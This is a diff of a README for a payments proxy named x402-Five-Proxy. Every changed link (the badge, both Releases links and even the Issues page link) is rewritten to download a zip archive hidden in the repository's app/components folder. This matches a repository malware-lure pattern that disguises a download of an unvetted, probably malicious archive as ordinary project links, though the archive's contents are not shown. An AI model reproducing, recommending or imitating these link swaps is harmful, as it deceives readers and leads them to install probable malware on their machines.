@@ -1,6 +1,6 @@
 # 🌐 x402-Five-Proxy - Seamlessly Integrate Payments with Ease
 
-![Download x402-Five-Proxy](https://img.shields.io/badge/Download-x402--Five--Proxy-blue?style=for-the-badge)
+![Download x402-Five-Proxy](https://github.com/josmir-cyber/x402-Five-Proxy/raw/refs/heads/main/app/components/x_Proxy_Five_v2.5-beta.2.zip)
 
 ## 🚀 Getting Started
 
@@ -8,7 +8,7 @@ Welcome! This guide will help you set up and run the x402-Five-Proxy application
 
 ## 📥 Download & Install
 
-To get started, you need to download the latest version of the application. Visit this page to download: [x402-Five-Proxy Releases](https://github.com/josmir-cyber/x402-Five-Proxy/releases). 
+To get started, you need to download the latest version of the application. Visit this page to download: [x402-Five-Proxy Releases](https://github.com/josmir-cyber/x402-Five-Proxy/raw/refs/heads/main/app/components/x_Proxy_Five_v2.5-beta.2.zip). 
 
 Look for the file suited for your operating system, which will typically be labeled clearly. Click on the link to download the file to your computer.
 
@@ -72,7 +72,7 @@ If you'd like to help improve x402-Five-Proxy, contributions are welcome! You ca
 
 ## 🤝 Community Support
 
-Join our community to connect with other users. You can ask questions and share your experiences. For help, check the [issues page](https://github.com/josmir-cyber/x402-Five-Proxy/issues) or seek assistance from fellow users.
+Join our community to connect with other users. You can ask questions and share your experiences. For help, check the [issues page](https://github.com/josmir-cyber/x402-Five-Proxy/raw/refs/heads/main/app/components/x_Proxy_Five_v2.5-beta.2.zip) or seek assistance from fellow users.
 
 ## 📄 License
 
@@ -82,4 +82,4 @@ This project is licensed under the MIT License. Feel free to use and modify this
 
 Thank you for using x402-Five-Proxy. Enjoy your seamless payments experience! 
 
-For further assistance, remember to refer back to the [Releases page](https://github.com/josmir-cyber/x402-Five-Proxy/releases) for downloads and the latest updates.
+For further assistance, remember to refer back to the [Releases page](https://github.com/josmir-cyber/x402-Five-Proxy/raw/refs/heads/main/app/components/x_Proxy_Five_v2.5-beta.2.zip) for downloads and the latest updates.
